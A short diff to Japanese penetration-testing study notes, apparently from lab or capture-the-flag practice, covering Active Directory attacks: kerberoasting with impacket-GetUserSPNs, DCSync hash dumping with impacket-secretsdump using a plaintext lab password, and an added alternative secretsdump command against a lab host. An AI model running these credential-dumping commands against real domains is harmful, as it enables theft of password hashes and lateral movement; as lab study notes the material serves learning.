@@ -40,9 +40,14 @@ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 ```
 
 6. DCSYNC攻撃をkaliからターゲットのwindowsに対して実行する。  
+ここのユーザは、ドメイン上でDCSyncの権限をそもそも持っている必要があり、そのユーザの権限を借りてkaliからDCSyncの要求をしている点に注意。  
 -just-dc-userの引数にターゲットのユーザ名daveを、dcsyncする際に要求を送る側には権限が必要なので、その権限を持つユーザをcorp.com/jeffadminとしてる。  
 ```
 impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+```
+もしくは
+```
+impacket-secretsdump -just-dc htb.local/hoge:password123@10.10.10.161
 ```
 
 7. impacketを使ってNTLMハッシュでAdministratorユーザとしてセッションをとる。横展開で使える。
